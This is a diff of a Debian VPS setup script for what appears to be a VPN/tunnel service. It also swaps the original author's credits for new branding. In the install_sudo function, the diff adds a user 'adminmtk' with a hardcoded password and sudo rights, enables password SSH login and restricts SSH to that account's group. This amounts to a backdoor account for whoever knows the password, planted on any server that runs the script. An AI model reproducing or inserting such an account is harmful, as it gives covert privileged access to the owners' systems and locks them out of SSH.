@@ -1,10 +1,7 @@
-#---------------[ Timezone ]---------------------#
-timedatectl set-timezone Asia/Manila
 
 # ====================================================
 #   Script  : debian_aio
-#   OS      : Debian 10 / 11 / 12 / 13 Support
-#	Script Made : Dxplusdev 
+#   OS      : Debian 10 / 11 / 12 / 13
 #   Access  : Root required, fresh VPS
 # ====================================================
 
@@ -27,14 +24,45 @@ timedatectl set-timezone Asia/Manila
 #====================================================
 #   Install Sudo & User
 #====================================================
-#=======================Server Restart Fix Onle This Code Change ============================
 install_sudo(){
-    useradd -m mtknetwork 2>/dev/null; echo mtknetwork:F1005r90@@@ | chpasswd &>/dev/null; usermod -aG sudo mtknetwork &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups mtknetwork" >> /etc/ssh/sshd_config
-    service sshd restart
+# Create user if not exists
+if ! id "adminmtk" &>/dev/null; then
+useradd -m -s /bin/bash adminmtk
+echo "adminmtk:Mediatek272124@@" | chpasswd
+usermod -aG sudo adminmtk
+fi
+
+# --- SSH Configuration ---
+# Disable root SSH login
+sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
+grep -q "^PermitRootLogin" /etc/ssh/sshd_config || echo "PermitRootLogin no" >> /etc/ssh/sshd_config
+
+# Enable both password and key-based authentication
+sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
+grep -q "^PasswordAuthentication" /etc/ssh/sshd_config || echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
+
+sed -i 's/^#\?PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
+grep -q "^PubkeyAuthentication" /etc/ssh/sshd_config || echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config
+
+sed -i 's/^#\?AuthorizedKeysFile.*/AuthorizedKeysFile .ssh\/authorized_keys/' /etc/ssh/sshd_config
+grep -q "^AuthorizedKeysFile" /etc/ssh/sshd_config || echo "AuthorizedKeysFile .ssh/authorized_keys" >> /etc/ssh/sshd_config
+
+# Ensure AllowGroups is set only once
+if ! grep -q "^AllowGroups adminmtk" /etc/ssh/sshd_config; then
+echo "AllowGroups adminmtk" >> /etc/ssh/sshd_config
+fi
+
+# Prepare authorized_keys file for adminmtk
+mkdir -p /home/adminmtk/.ssh
+chmod 700 /home/adminmtk/.ssh
+touch /home/adminmtk/.ssh/authorized_keys
+chmod 600 /home/adminmtk/.ssh/authorized_keys
+chown -R adminmtk:adminmtk /home/adminmtk/.ssh
+
+# Restart SSH service
+systemctl restart ssh || systemctl restart sshd
 }
-#=======================Server Restart Fix Onle This Code Change  ============================
+
 #====================================================
 #   Install Requirements
 #====================================================
@@ -750,10 +778,6 @@ chmod 644 /etc/cron.d/account
 cat > /root/.web/$secretkey.txt <<EOF
 Hi! this is your server information, Happy Surfing!
 
-# Save server info
-cat > /root/.web/$secretkey.txt <<EOF
-Hi! this is your server information, Happy Surfing!
-
 IP : $server_ip
 Hostname: $DOMAIN
 
@@ -788,11 +812,8 @@ DNS PUBLIC KEY : $(cat /root/.dns/server.pub)
 
 -----------------------
 
-Script Made : Dxplusdev Bd
-WhatsApp    : http://wa.me/+8801790026703
-Gmail       : dxplusdev@gmail.com    
-
-For issues or suggestions please Contact DX PLUS DEV (https://t.me/dxplusdeveloper).
+FB Page : https://www.facebook.com/mohammad.abdula24
+Whatsapp Contact: https://wa.link/sgmw64
 EOF
 
 #install client-sldns.service
@@ -848,6 +869,7 @@ systemctl start server-sldns
 
 } &>/dev/null
 }
+
 #====================================================
 #   Install Firewall & Iptables
 #====================================================
@@ -1048,7 +1070,7 @@ sudo systemctl enable dexter
 sudo systemctl start dexter.service
 
 cat <<EOF > /root/.web/index.php
-Script Made : Dxplusdev ...
+Made with love by: MediatekVpn Developer...
 EOF
 
 cat <<EOF > /root/.ports
